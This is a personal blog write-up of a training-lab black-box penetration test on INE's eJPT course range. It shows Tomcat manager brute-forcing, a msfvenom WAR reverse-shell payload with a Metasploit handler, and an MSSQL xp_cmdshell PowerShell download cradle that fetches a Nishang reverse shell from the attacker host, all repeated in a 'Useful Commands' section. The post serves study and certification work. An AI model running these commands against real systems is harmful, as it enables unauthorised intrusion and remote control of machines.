<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="PTS: Black-Box Penetration Test 1" /><meta name="author" content="Robin Goyal" /><meta property="og:locale" content="en" /><meta name="description" content="This is the 1st writeup of 3 black-box penetration tests offered in INE’s Penetration Testing Student course that I am currently doing in my journey to obtain the eJPT certification." /><meta property="og:description" content="This is the 1st writeup of 3 black-box penetration tests offered in INE’s Penetration Testing Student course that I am currently doing in my journey to obtain the eJPT certification." /><link rel="canonical" href="https://robgoyal.github.io/posts/black-box-pentest-1/" /><meta property="og:url" content="https://robgoyal.github.io/posts/black-box-pentest-1/" /><meta property="og:site_name" content="Robin Goyal" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-18T18:00:00-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="PTS: Black-Box Penetration Test 1" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Robin Goyal"},"dateModified":"2021-08-25T08:38:41-04:00","datePublished":"2021-08-18T18:00:00-04:00","description":"This is the 1st writeup of 3 black-box penetration tests offered in INE’s Penetration Testing Student course that I am currently doing in my journey to obtain the eJPT certification.","headline":"PTS: Black-Box Penetration Test 1","mainEntityOfPage":{"@type":"WebPage","@id":"https://robgoyal.github.io/posts/black-box-pentest-1/"},"url":"https://robgoyal.github.io/posts/black-box-pentest-1/"}</script><title>PTS: Black-Box Penetration Test 1 | Robin Goyal</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Robin Goyal"><meta name="application-name" content="Robin Goyal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/profilepic.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Robin Goyal</a></div><div class="site-subtitle font-italic">Software Developer & Cybersecurity Enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="/resume.pdf" aria-label="resume" class="order-3" > <i class="fas fa-file-alt"></i> </a> <a href="https://github.com/robgoyal" aria-label="github" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['robin.goyal.swd','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/robingoyal" aria-label="linkedin" class="order-6" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>PTS: Black-Box Penetration Test 1</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>PTS: Black-Box Penetration Test 1</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Robin Goyal </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Aug 18, 2021, 6:00 PM -0400" >Aug 18, 2021<i class="unloaded">2021-08-18T18:00:00-04:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Aug 25, 2021, 8:38 AM -0400" >Aug 25, 2021<i class="unloaded">2021-08-25T08:38:41-04:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2166 words">12 min read</span></div></div><div class="post-content"><p>This is the 1<sup>st</sup> writeup of 3 black-box penetration tests offered in INE’s Penetration Testing Student course that I am currently doing in my journey to obtain the eJPT certification.</p><h2 id="scenario">Scenario</h2><blockquote><p>You are responsible for engaging in a Black-box Penetration Test for the 172.16.64.0/24 range. Your goal is to read the flag file on each machine. On some of them, you will be required to exploit a remote code execution vulnerability in order to read the flag.</p></blockquote><p>Now that we have a target space and instructions, let’s get right into it.</p><h2 id="enumeration--exploitation">Enumeration &amp; Exploitation</h2><p>The first step is to determine the available machines in the network ignoring our own attack machine’s address at 172.16.64.10. We’ll use fping to perform a quick network scan. Alternatively, we could use nmap for host discovery which provides the added advantage of ARP requests along with ICMP requests.</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/fping-scan-results.jpg" alt="FPING Scan Results" class="right" /> Fping command options:</p><ul><li><code class="language-plaintext highlighter-rouge">-a</code>: show only alive hosts<li><code class="language-plaintext highlighter-rouge">-g</code>: perform a network scan<li><code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code>: redirect all error messages to null</ul><p>From the scenario instructions, each of the target machines contain a flag that we must be able to read. Let’s begin by exploring the first machine.</p><h3 id="1721664101">172.16.64.101</h3><p>The first step is to enumerate the services, OS detection, and service version detection using Nmap.</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.101/nmap-scan-results.jpg" alt="172.16.64.101 Nmap Scan Results" /></p><p>A detailed nmap scan of the top 1000 ports reveals 3 open ports:</p><ul><li>22 (SSH)<li>8080 (Apache Tomcat)<li>9080 (Apache Tomcat)</ul><p>There were no exact OS matches but the OpenSSH version reveals that this is an Ubuntu Linux machine.</p><h4 id="ssh">SSH</h4><p>There’s not much to do with SSH except banner grab if there is no potential username or password lists. There was no displayed banner in this situation either.</p><h4 id="http-8080-apache-tomcat">HTTP 8080 (Apache Tomcat)</h4><p>The first few basic enumeration steps I perform for a web application include exploring the content and all hyperlinked pages, viewing the source code for hints, and checking for robots.txt. If none of those enumeration steps lead to any results, we can move on to directory enumeration.</p><p>With gobuster and the common.txt wordlist found in the SecLists repo, there are two entries of interest that we can explore. Both will lead to the same application so either “/manager” or “/host-manager” is fair game.</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.101/8080-gobuster-results.jpg" alt="172.16.64.101 Apache Tomcat Gobuster Results" /></p><p>The “/manager” will redirect us to “/manager/html” which is protected by HTTP Basic Authentication. We can use Burpsuite or Hydra to attempt to brute force the login page using common credentials for the Tomcat Manager page<sup id="fnref:tomcat-creds" role="doc-noteref"><a href="#fn:tomcat-creds" class="footnote" rel="footnote">1</a></sup>.</p><p><strong>NOTE</strong>: Too many unsuccessful attempts could lock out the account in which case, the lab would need to reset which I unfortunately had to do.</p><p>We received access to the Manager’s landing page using the credentials <code class="language-plaintext highlighter-rouge">tomcat:s3cret</code> which I’ve previously come across on Hack the Box.</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.101/8080-manager-landing-page.jpg" alt="172.16.64.101 Tomcat Manager Landing Page" /></p><p>With administrative access to the Web Application Manager, we can obtain a reverse shell by deploying a WAR application<sup id="fnref:tomcat-exploit" role="doc-noteref"><a href="#fn:tomcat-exploit" class="footnote" rel="footnote">2</a></sup>. It is possible to exploit this service using Metasploit’s tomcat_mgr_upload exploit but I will attempt this manually.</p><p>The first step is to generate a WAR executable using msfvenom and a valid Meterpreter payload.</p><p><code class="language-plaintext highlighter-rouge">msfvenom -p java/meterpreter/reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o rshell.war</code>.</p><p>Breaking down the above command:</p><ul><li><code class="language-plaintext highlighter-rouge">-p java/meterpreter/reverse_tcp</code>: Staged Meterpreter payload<li><code class="language-plaintext highlighter-rouge">LHOST=172.16.64.10</code>: Attacker machine’s IP address to connect back to<li><code class="language-plaintext highlighter-rouge">LPORT=4444</code>: Attacker machine’s port to connect back to<li><code class="language-plaintext highlighter-rouge">-f war</code>: Output format as a war file<li><code class="language-plaintext highlighter-rouge">-o rshell.war</code>: Save the payload to rshell.war</ul><p>With a meterpreter payload, we will have to create a handler in Metasploit to deploy the staged Meterpreter shell. We could have used a java/shell_reverse_tcp payload which is stageless and catchable by netcat but I wanted to try something outside of my usual tactics.</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.101/metasploit-configuration.jpg" alt="172.16.64.101 Metasploit Configuration" /></p><p>Use the exploit/multi/handler module in Metasploit and configure the options with the same payload, listening host, and listening port as selected in the msfvenom payload. All that’s left is to run the handler.</p><p>Back to the Tomcat Application Manager page, upload the deploy the rshell.war file. Once uploaded, the deployed application will execute the WAR file once we browse to /rshell. Switching back to the Metasploit, an open Meterpreter session will be waiting for us!</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.101/flag.jpg" alt="172.16.64.101 Flag" /></p><p>We obtained a Meterpreter shell as the tomcat8 user. There is no need for privilege escalation as the excepted flag files are accessible by this service user in the adminels and developer user’s home directory.</p><p>There wasn’t much post-exploitation data to obtain so we can be confident that this machine has been fully compromised and we can move on to the next.</p><h3 id="1721664140">172.16.64.140</h3><p>First step is the same as the previous machine which is to run an Nmap scan.</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.140/nmap-scan-results.jpg" alt="172.16.64.140 Nmap Results" /></p><p>Looks like there’s only 1 HTTP port running Apache on an Ubuntu OS.</p><h4 id="http">HTTP</h4><p>Using my initial set of steps enumerating a web application, there were no obvious details so we’ll perform the directory enumeration using gobuster and the directory-list-2.3-small.txt wordlist also a part of the SecLists repository. The only interesting endpoint is the /project endpoint.</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.140/auth.jpg" alt="172.16.64.140 Authentication Page" /></p><p>Browsing to this endpoint in the web browser, we see it’s protected by HTTP Basic Authentication. The site leaves a note that says “admin”. Attempting to use <code class="language-plaintext highlighter-rouge">admin:admin</code> as a hunch for the credentials provided us access!</p><p>We land upon a business solutions page but browsing the application and any hyperlinked pages did not lead anywhere. Let’s perform further directory enumeration using dirbuster. The reason for choosing dirbuster over gobuster this time is that the former will perform recursive searches which may be useful for nested directories while the latter lacks this functionality.</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.140/dirbuster-results.jpg" alt="172.16.64.140 Dirbuster" /></p><p>Once we configured dirbuster with the target information, selected wordlist, and the username and password for the /project endpoint’s basic authentication (You can do this by selecting Options -&gt; Advanced Options -&gt; Authentication Options), there are several text files at the endpoint /project/backup/test.</p><p>Two of these files, sdadas.txt and test1.txt contain interesting information along with the sdadas.txt including a line that points to the location of the flag for this machine!</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre># sdadas.txt
Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
/var/www/html/project/354253425234234/flag.txt
</pre></table></code></div></div><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre># test1.txt
https://stackoverflow.com/questions/1134319/difference-between-a-user-and-a-login-in-sql-server
</pre></table></code></div></div><p>For most Apache web services, the root path of the web server is located at /var/www/html. Therefore, browsing to /project/354253425234234/flag.txt provides us access to the below text file.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>Congratulations, you exploited this machine!
Now continue to others.
</pre></table></code></div></div><p>Assessing the other data in the two text files, there are potentially valid credentials to a MS SQL Server database which might be useful in the remaining machines.</p><h3 id="1721664182">172.16.64.182</h3><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.182/nmap-scan-results.jpg" alt="172.16.64.182 Nmap Results" /></p><p>With no valid credentials, there is little value in brute forcing the SSH service unless we are able to find credentials by enumerating the other machines further. We will revisit this machine later.</p><h3 id="1721664199">172.16.64.199</h3><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.199/nmap-scan-results.jpg" alt="172.16.64.199 Nmap Results" /></p><p>The Nmap results display several services on a Windows machine including the MS SQL service which is where the credentials from the 2<sup>nd</sup> must be used along with SMB. There isn’t much other interesting information so let’s explore these services starting with the SMB service.</p><h4 id="smb">SMB</h4><p>Attempting to list the SMB shares using smbclient returned access denied so let’s move on to the SQL service.</p><h4 id="ms-sql">MS SQL</h4><p>We could use Metasploit’s mssql modules to login, enumerate, and generate a reverse shell but let’s use IMPacket’s mssqlclient for another manual attempt at exploitation.</p><p>IMPacket’s mssqlclient.py module allows you to connect to the SQL database with valid credentials and execute system commands. We can generate a reverse shell using Nishang’s Invoke-PowershellTcp.ps1 script<sup id="fnref:mssqlclient-reverse-shell" role="doc-noteref"><a href="#fn:mssqlclient-reverse-shell" class="footnote" rel="footnote">3</a></sup>. However, before we use this Python module, we need to configure a few things.</p><h5 id="prepare-reverse-shell">Prepare Reverse Shell</h5><p>Once we have the Powershell script from the nishang <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">repository</a>, I added the following line to the bottom of the file so that Powershell will execute the command once the script is ran.</p><p><code class="language-plaintext highlighter-rouge">Invoke-PowershellTcp -Reverse -IPAddress 172.16.64.10 -Port 4444</code></p><h5 id="netcat-listener">Netcat Listener</h5><p>Create a netcat listener to capture the reverse shell at port 4444. By default, the following command will listen on all interfaces.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-nvlp</span> 4444
</pre></table></code></div></div><h5 id="python-server">Python Server</h5><p>A simple HTTP server needs to be stood up so that we can transfer Nishang’s Powershell script to the target machine. This will all make more sense below!</p><p><strong>Note</strong>: The server is running on port 80 to potentially evade any firewalls for uncommon ports as port 80 is typically allowed.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 <span class="nt">-m</span> http.server 80
</pre></table></code></div></div><p>Once the above is configured, we can connect the steps above to receive our reverse shell. The initial setup of all these services looks like the following.</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.199/tmux.jpg" alt="172.16.64.199 Pre-Exploitation Tmux Screen" /></p><p>At the SQL prompt, run <code class="language-plaintext highlighter-rouge">enable_xp_cmdshell</code> to enable the xp_cmdshell feature which will allow us to run system commands. Next, we will download the reverse shell script from our simple HTTP server. This will trigger the last line in the rev.ps1 to be executed by Powershell and our netcat listener will catch the reverse shell.</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.199/tmux-exploit-stage.jpg" alt="172.16.64.199 Post-Exploitation Tmux Screen" /></p><p>In the top right pane is the request for the rev.ps1 file and in the bottom pane, we caught the reverse shell as the NT_AUTHORITY\System user. The command in the top-left pane is the system command to download a file and execute it using Powershell.</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.199/flag-location.jpg" alt="172.16.64.199 Flag Search" /></p><p>With a Powershell prompt at our disposal, we can search for all text files from the Users directory. <code class="language-plaintext highlighter-rouge">Get-ChildItem -Path C:\Users -Recurse -Filter "*.txt"</code></p><p>Within the AdminELS user’s Desktop directory, there are three files, one of which is the flag and the other is an id_rsa.pub file.</p><p><img data-proofer-ignore data-src="/assets/img/posts/black-box-pentest-1/172.16.64.199/flag.jpg" alt="172.16.64.199 Flag Search" /></p><p>We have fully exploited this machine and we also have an id_rsa.pub file which is likely the public key required to connect to the 3<sup>rd</sup> machine’s SSH service.</p><h3 id="1721664182-revisited">172.16.64.182 Revisited</h3><p>With the SSH public key from the post-exploitation stage of the 4<sup>th</sup> machine, we are ready to explore the 3<sup>rd</sup> machine.</p><blockquote><p><code class="language-plaintext highlighter-rouge">ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAlGWzjgKVHcpaDFvc6877t6ZT2ArQa+OiFteRLCc6TpxJ/lQFEDtmxjTcotik7V3DcYrIv3UsmNLjxKpEJpwqELGBfArKAbzjWXZE0VubmBQMHt4WmBMlDWGcKu8356blxom+KR5S5o+7CpcL5R7UzwdIaHYt/ChDwOJc5VK7QU46G+T9W8aYZtvbOzl2OzWj1U6NSXZ4Je/trAKoLHisVfq1hAnulUg0HMQrPCMddW5CmTzuEAwd8RqNRUizqsgIcJwAyQ8uPZn5CXKWbE/p1p3fzAjUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22#############################################################################################################################################################################################</code></p></blockquote><p>However, this doesn’t look like a valid public key. Fortunately for us, the credentials are present in the data as <code class="language-plaintext highlighter-rouge">developer:dF3334slKw</code>. After connecting, the flag is readily available in the developer user’s home directory. With that, we have obtained a flag from each target machine and completed the black-box penetration test!</p><h2 id="reflection">Reflection</h2><p>I have experience with THM and HTB’s single machine exploitation but this is the first network pentest in a simulated environment that I have done and it was incredibly fun. I highly recommend <a href="https://my.ine.com/CyberSecurity/learning-paths/a223968e-3a74-45ed-884d-2d16760b8bbd/penetration-testing-student">INE’s PTS</a> course which is free to take as part of their Starter Pass (could change later) and contains all the study material necessary to take the <a href="https://elearnsecurity.com/product/ejpt-certification/">eJPT</a> certification.</p><p>In terms of this specific penetration test, one of my biggest weaknesses is not fully enumerating a potential attack vector before moving on to the next one. As everyone says, enumeration is the most important stage and it is definitely something to focus on moving forward.</p><p>Reflection on what I learned with this practical simulated penetration test:</p><ul><li>Utilizing IMPacket’s MSSQLClient module to generate a reverse shell<li>Using fping and nmap to perform network sweeps and individual machine scans<li>Generating a Meterpreter payload using msfvenom and catching it using Metasploit’s handler module<li>Exploiting Apache Tomcat applications<li>Directory enumeration (recursive or non-recursive)<li>Brute forcing HTTP basic authentication using Burpsuite or Hydra (not displayed but I tried it just to see how it would work. I will display the command below).</ul><h2 id="useful-commands">Useful Commands</h2><p>At the end of each writeup, I’ll include a section on the useful commands or set of commands that I learned about and used for future use.</p><h3 id="hydra-http-basic-authentication">Hydra HTTP Basic Authentication</h3><p>Hydra’s http-get module will brute force HTTP GET authentication. You are able to specify the authentication method but the default is BASIC authentication. Use the browser’s developer tools or Burpsuite to determine the authentication endpoint.</p><p><code class="language-plaintext highlighter-rouge">hydra -L usernames.txt -P passwords.txt 172.16.64.101 http-get /manager/html</code></p><h3 id="msfvenom-war-payload-with-metasploit-handler">Msfvenom WAR payload with Metasploit Handler</h3><p>To exploit an Apache Tomcat Manager application with a WAR executable using MSFvenom, use the following command.</p><p><code class="language-plaintext highlighter-rouge">msfvenom -p java/meterpreter/reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o rshell.war</code></p><p>Since this is a staged Meterpreter payload, we’ll have to use Meterpreter’s multi handler to catch the reverse shell. Run the following commands once you are in the msfconsole.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>use exploit/multi/handler
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 172.16.64.10
set LPORT 4444
run
</pre></table></code></div></div><h3 id="network-scanning">Network Scanning</h3><p>To map a network, we can run either two commands.</p><p><code class="language-plaintext highlighter-rouge">fping -a -g 172.16.64.0/24 2&gt;/dev/null</code></p><p><code class="language-plaintext highlighter-rouge">sudo nmap -sn 172.16.64.0/24</code></p><ul><li><code class="language-plaintext highlighter-rouge">-sn</code>: disables port scan</ul><p>The advantage of the nmap scan over fping is that nmap will also send ARP requests.</p><h3 id="service-enumeration">Service Enumeration</h3><p>To analyze the services, their versions, OS detection, scan all ports, and save the file:</p><p><code class="language-plaintext highlighter-rouge">sudo nmap -sC -sV -O -oN nmap/scan-results.txt 172.16.64.101</code></p><ul><li><code class="language-plaintext highlighter-rouge">-sC</code>: Run default scripts<li><code class="language-plaintext highlighter-rouge">-sV</code>: Port version detection<li><code class="language-plaintext highlighter-rouge">-O</code>: OS detection<li><code class="language-plaintext highlighter-rouge">-oN</code>: Save the scan results to a file</ul><h3 id="directory-enumeration">Directory Enumeration</h3><p><code class="language-plaintext highlighter-rouge">gobuster dir -u http://172.16.64.101:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -x "php,jsp"</code></p><ul><li><code class="language-plaintext highlighter-rouge">-u</code>: Target URL<li><code class="language-plaintext highlighter-rouge">-w</code>: Wordlist<li><code class="language-plaintext highlighter-rouge">-t</code>: Number of threads<li><code class="language-plaintext highlighter-rouge">-x</code>: Additional extensions to append to the words in the wordlist</ul><h3 id="file-searching">File Searching</h3><h4 id="meterpreter">Meterpreter</h4><p><code class="language-plaintext highlighter-rouge">search -f "*.txt"</code></p><h4 id="powershell">Powershell</h4><p><code class="language-plaintext highlighter-rouge">Get-ChildItem -Path C:\Users -Recurse -Filter "*.txt"</code></p><h3 id="mssql-reverse-shell">MSSQL Reverse Shell</h3><p>Connect to MSSQL Server using IMPacket’s mssqlclient.py module.</p><p><code class="language-plaintext highlighter-rouge">python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py fooadmin:fooadmin@172.16.64.199</code></p><p>Once connected, enable system commands with <code class="language-plaintext highlighter-rouge">enable_xp_cmdshell</code> and create a reverse shell using the Powershell command.</p><p><code class="language-plaintext highlighter-rouge">xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://172.16.64.10:80/rev.ps1\")</code></p><p>This involves initializing an HTTP web server to serve the file as well as a netcat listener to catch the reverse shell. In this case, rev.ps1 is the Invoke-PowerShellTcp.ps1 file from the nishang repository.</p><h2 id="references">References</h2><div class="footnotes" role="doc-endnotes"><ol><li id="fn:tomcat-creds" role="doc-endnote"><p><a href="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown">https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown</a>. <a href="#fnref:tomcat-creds" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:tomcat-exploit" role="doc-endnote"><p><a href="https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell">https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell</a> <a href="#fnref:tomcat-exploit" class="reversefootnote" role="doc-backlink">&#8617;</a></p><li id="fn:mssqlclient-reverse-shell" role="doc-endnote"><p><a href="https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/">https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/</a> <a href="#fnref:mssqlclient-reverse-shell" class="reversefootnote" role="doc-backlink">&#8617;</a></p></ol></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/cybersecurity/'>Cybersecurity</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ine/" class="post-tag no-text-decoration" >INE</a> <a href="/tags/pts/" class="post-tag no-text-decoration" >PTS</a> <a href="/tags/ejpt/" class="post-tag no-text-decoration" >eJPT</a> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >pentesting</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=PTS: Black-Box Penetration Test 1 - Robin Goyal&url=https://robgoyal.github.io/posts/black-box-pentest-1/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a 